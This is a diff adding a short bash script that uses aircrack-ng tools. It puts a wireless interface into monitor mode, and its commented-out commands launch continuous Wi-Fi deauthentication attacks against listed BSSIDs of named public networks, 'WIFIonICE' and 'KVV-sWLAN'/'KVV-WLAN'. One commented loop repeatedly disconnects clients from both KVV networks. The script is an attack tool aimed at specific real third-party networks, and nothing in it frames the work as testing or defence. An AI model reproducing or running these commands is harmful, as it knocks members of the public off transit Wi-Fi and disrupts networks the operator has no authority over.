@@ -1,0 +1,35 @@
+#!/bin/bash
+
+#aireplay-ng -0 0 -a accesspointBSSID wlp2s0
+#aireplay-ng -0 0 -c 1 -a 04:F0:21:34:B2:2E wlp2s0mon
+
+#airodump-ng -c 1 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 2 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 3 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 4 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 5 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 6 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 7 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+#airodump-ng -c 8 --bssid 04:F0:21:34:B2:2E wlp2s0mon
+
+#aireplay-ng -0 0 -a 04:F0:21:34:B2:2E -e "KVV-sWLAN" wlp2s0mon
+
+
+#activation:
+sudo airmon-ng check kill
+sudo airmon-ng start wlp2s0
+sudo airodump-ng -c 1 wlp2s0mon
+
+#sudo aireplay-ng -0 0 -a 48:74:6E:80:37:6D -e "WIFIonICE" wlp2s0mon
+#sudo aireplay-ng -0 0 -a 00:0E:8E:71:05:77 -e "WIFIonICE" wlp2s0mon
+
+#00:0E:8E:6E:58:05
+#00:0E:8E:71:05:7700:0E:8E:71:05:77
+
+#while [ 0 -lt 1 ]; do
+#	aireplay-ng -0 1 -a 04:F0:21:34:B2:2E -e "KVV-sWLAN" wlp2s0mon
+#	aireplay-ng -0 1 -a 04:F0:21:34:B2:2D -e "KVV-WLAN" wlp2s0mon
+#done
+
+sudo airmon-ng stop wlp2s0mon
+sudo service network-manager start
